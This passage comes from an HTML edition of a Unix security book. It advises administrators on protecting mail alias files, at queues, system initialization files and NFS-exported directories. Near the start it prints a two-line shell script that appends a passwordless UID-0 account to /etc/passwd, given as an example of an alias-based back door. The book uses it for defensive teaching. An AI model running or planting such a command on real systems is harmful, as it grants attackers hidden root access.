attacker would make <i class="filename">local_uucheck</I
> a compiled program to
hide its obvious effect.</P
></BLOCKQUOTE
><blockquote class="screen"><pre class="screen">#!/bin/sh
echo &quot;uucheck::0:0:fake uucp:/:/bin/sh&quot; &gt;&gt; /etc/passwd</PRE
></BLOCKQUOTE
><p class="para">The attacker
now has a back door into the system. Whenever he sends mail to user
<i class="systemitem.username">uucheck,</I
> the system will put an entry into the password file that
will allow the attacker to log in. He can then edit the entry out
of the password file, and have free reign on the system. How often
do you examine your alias file?</P
><p class="para">There are other ways
of exploiting email programs that do not require the creation of
<span class="acronym">SUID</SPAN
> programs. We have omitted them from this
text for safety, as an astonishingly large number of sites have
world-writable alias files.</P
><p class="para"><em class="emphasis">Be sure that your
alias file is not writable by users </EM
>(if for no other
reason than the fact that it gives users an easy way to intercept
your mail). Make certain that no alias runs a program or writes
to a file unless you are absolutely 100% certain what the
program does.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.4">11.5.3.4 The at program</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15609"></A
>Most
<span class="acronym">UNIX</SPAN
> systems have a program called <kbd class="command">at</KBD
> that allows
users to specify commands to be run at a later time. This program
is especially useful for jobs that only need to be run once, although
it is also useful on systems that do not have a modern version of
<kbd class="command">cron</KBD
> that allows users to set their own delayed jobs.</P
><p class="para">The
at command collects environment information and commands from the
user and stores them in a file for later execution. The user ID
to be used for the script is taken from the queued file. If an attacker
can get into the queue directory to modify the file owner or contents,
it is possible that the files can be subverted to do something other
than what was intended. Thus, for obvious reasons, the directory
where at stores its files should not be writable by others, and
the files it creates should not be writable (or readable) by others.</P
><p class="para">Try running <kbd class="command">at</KBD
> on your system. If the resulting queue
files (usually in <i class="filename">/usr/spool/atrun,</I
> <i class="filename">/usr/spool/at,</I
>
or <i class="filename">/var/spool/atrun)</I
> can be modified
by another user, you should fix the situation or consider disabling
the <kbd class="command">atrun</KBD
> daemon (usually dispatched by cron every 15 minutes).</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.5">11.5.3.5 System initialization files</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15624"></A
><a class="indexterm" name="AUTOID-15627"></A
><a class="indexterm" name="AUTOID-15630"></A
><a class="indexterm" name="AUTOID-15633"></A
>The
system initialization files are another ideal place for an attacker
to place commands that will allow access to the system. By putting
selected commands in the <i class="filename">/etc/rc*</I
>, <i class="filename">/etc/init.d/*,</I
>
<i class="filename">/etc/rc?.d</I
>, and other standard files, an attacker
could reconstruct a back door into the system whenever the system
is rebooted or the run-level is changed. All the files in <i class="filename">/etc</I
>
should be kept unwritable by other users!</P
><p class="para">Be especially
careful regarding the <a class="indexterm" name="AUTOID-15640"></A
><a class="indexterm" name="AUTOID-15642"></A
><a class="indexterm" name="AUTOID-15645"></A
>
log
files created by programs automatically run during system initialization.
These files can be used to overwrite system files through the use
of symlinks.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.6">11.5.3.6 Other files</A
></H4
><p class="para">Other files may be run on
a regular basis, and these should be protected in a similar manner.
The programs and data files should be made nonwritable (and perhaps
nonreadable) by unprivileged users. All the directories containing
these files and commands up to and including the <i class="filename">root</I
> directory
should be made nonwritable.</P
><p class="para">As an added precaution,
none of these files or directories (or the ones mentioned earlier)
should be exported via <span class="acronym">NFS</SPAN
> (described in <a class="xref" href="ch20_01.htm" title="NFS">Chapter 20, <cite class="chapter">NFS</CITE
></A
>). 
If you must export the files via <span class="acronym">NFS</SPAN
>,
export them read-only, and/or set their ownership to <i class="filename">root</I
>.</P
><p class="para">Note that this presents a possible contradiction: setting
files to <i class="filename">root</I
> that don't need to be set to <i class="filename">root</I
> to run.
For instance, if you export the <span class="acronym">UUCP</SPAN
> library
via <span class="acronym">NFS</SPAN
>, you would need to set the files and
directory to be owned by <i class="filename">root</I
> to prevent their modification by an
attacker who has subverted one of your <span class="acronym">NFS</SPAN
> hosts.
At the same time, that means that the shell files may be forced
to run as <i class="filename">root</I
> instead of as <kbd class="command">uucp</KBD
>&nbsp;- otherwise, they won't
be able to modify some of the files they need to alter!</P
><p class="para">In
circumstances such as these, you should export the directories read-only
and leave the files owned by <kbd class="command">uucp</KBD
>. If there is any reason at all
to have writable files or subdirectories in what you export,[9] use symbolic links to keep a separate
copy on each system. For instance, you could replace a file in the
exported directory via a link to <i class="filename">/local/uucp</I
> or
<i class="filename">/var/uucp</I
> and create a local version on each machine.</P
><blockquote class="footnote"><p class="para">[9] No obvious example comes to mind. We recommend against thinking
of any!</P
></BLOCKQUOTE
><p class="para">Other files and directories to protect include:</P
><ul class="itemizedlist"><li class="listitem"><p class="para">The <span class="acronym">NIS/NIS</SPAN
>+
database and commands (often in <i class="filename">/usr/etc/yp</I
>
or <i class="filename">/var/nis)</I
></P
></LI
><li class="listitem"><p class="para">The files in <a class="indexterm" name="AUTOID-15681"></A
><a class="indexterm" name="AUTOID-15684"></A
><a class="indexterm" name="AUTOID-15687"></A
>
<i class="filename">/usr/adm,</I
>
<i class="filename">/var/adm</I
>, and <i class="filename">/or /var/log</I
>
used for accounting and logging</P
></LI
><li class="listitem"><p class="para">The files in your mailer queue and delivery area
(usually <i class="filename">/usr/spool/mqueue</I
> and <i class="filename">/usr/spool/mail</I
>
or linked to those names)</P
></LI
><li class="listitem"><p class="para">All the files in the libraries <a class="indexterm" name="AUTOID-15699"></A
><a class="indexterm" name="AUTOID-15701"></A
><a class="indexterm" name="AUTOID-15704"></A
>
(<i class="filename">/lib, /usr/lib,</I
>
and <i class="filename">/usr/local/lib</I
>)</P
></LI
></UL
><p class="para">No files that are used as
part of your system's start-up procedure or for other automatic
operations should be exported via <span class="acronym">NFS</SPAN
>. If these
files must be exported using <span class="acronym">NFS</SPAN
>, they should
be set on the server to be owned by root and placed in a directory
that is owned by root. Do not export files or directories for <span class="acronym">UUCP</SPAN
>
or other subsystems that require ownership by users other than root.<a class="indexterm" name="AUTOID-15713"></A
></P
></DIV
></DIV
></DIV
><div class="htmlnav"><p></P
><hr align="LEFT" width="515" title="footer"><table width="515" border="0" cellspacing="0" cellpadding="0"><tr><td align="LEFT" valign="TOP" width="172"><a class="SECT1" href="ch11_04.htm" title="11.4 Entry"><img src="../gifs/txtpreva.gif" alt="Previous: 11.4 Entry" border="0"></A
></TD
><td align="CENTER" valign="TOP" width="171"><a class="book" href="index.htm" title="Practical UNIX &amp; Internet Security"><img src="../gifs/txthome.gif" alt="Practical UNIX &amp; Internet Security" border="0"></A
></TD
><td align="RIGHT" valign="TOP" width="172"><a class="SECT1" href="ch11_06.htm#PUIS-CHP-11-SECT-6.1.2" title="11.6 Protecting Your System"><img src="../gifs/txtnexta.gif" alt="Next: 11.6 Protecting Your System" border="0"></A
></TD
></TR
><tr><td align="LEFT" valign="TOP" width="172">11.4 Entry</TD
><td align="CENTER" valign="TOP" width="171"><a class="index" href="index/idx_0.htm" title="Book Index"><img src="../gifs/index.gif" alt="Book Index" border="0"></A
></TD
><td align="RIGHT" valign="TOP" width="172">11.6 Protecting Your System</TD
></TR
></TABLE
><hr align="LEFT" width="515" title="footer"><p class="nav"><font size="-1">[ <a href="../index.htm" title="The Networking CD Bookshelf">Library Home</A
> | <a href="../dnsbind/index.htm" title="DNS &amp; BIND">DNS &amp; BIND</A
> | <a href="../tcpip/index.htm" title="TCP/IP Network Administration">TCP/IP</A
> | <a href="../sendmail/index.htm" title="sendmail">sendmail</A
> | <a href="../smdref/index.htm" title="sendmail Desktop Reference">sendmail Reference</A
> | <a href="../firewall/index.htm" title="Building Internet Firewalls">Firewalls</A
> | <a href="index.htm" title="Practical UNIX &amp; Internet Security">Practical Security</A
> ]</FONT
></P
></DIV
></BODY
></HTML
>
